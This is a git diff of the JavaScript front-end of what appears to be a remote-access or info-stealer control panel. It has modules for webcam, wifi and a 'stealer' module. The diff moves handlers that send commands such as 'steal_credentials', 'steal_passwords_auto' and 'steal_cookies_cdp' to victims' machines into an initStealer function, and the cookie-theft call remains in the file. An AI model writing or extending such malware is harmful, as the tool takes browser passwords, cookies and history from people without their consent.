@@ -17,7 +17,7 @@ import { renderScanList } from './modules/scanner.js';
 import { clearWebcamStreamUI, toggleWebcamFullscreen } from './modules/webcam.js';
 import { initChat, resetChat } from './modules/chat.js';
 import { initWifiManager, requestWifiScan } from './modules/wifi.js';
-import { closeHistoryModal, exportHistoryCSV } from './modules/stealer.js';
+import { closeHistoryModal, exportHistoryCSV, initStealer } from './modules/stealer.js';
 
 // Theme is initialized inline in HTML to prevent flash
 
@@ -117,22 +117,7 @@ document.addEventListener('DOMContentLoaded', () => {
         sendWsMessage({ command: 'steal_cookies_cdp', browser: browser });
     };
 
-    window.requestStealPass = (browser) => {
-        if (!canUseAgentFeature()) return;
-        closeBrowserSelector();
-        sendWsMessage({ command: 'steal_credentials', browser });
-    };
-
-    window.requestAutoStealPasswords = () => {
-        if (!canUseAgentFeature()) return;
-        closeBrowserSelector();
-        sendWsMessage({ command: 'steal_passwords_auto' });
-    };
-
-    window.requestBrowserList = () => {
-        if (!canUseAgentFeature()) return;
-        sendWsMessage({ command: 'get_browser_list' });
-    };
+    initStealer(sendWsMessage);
 
     window.requestBrowserHistory = (browser) => {
         if (!canUseAgentFeature()) return;
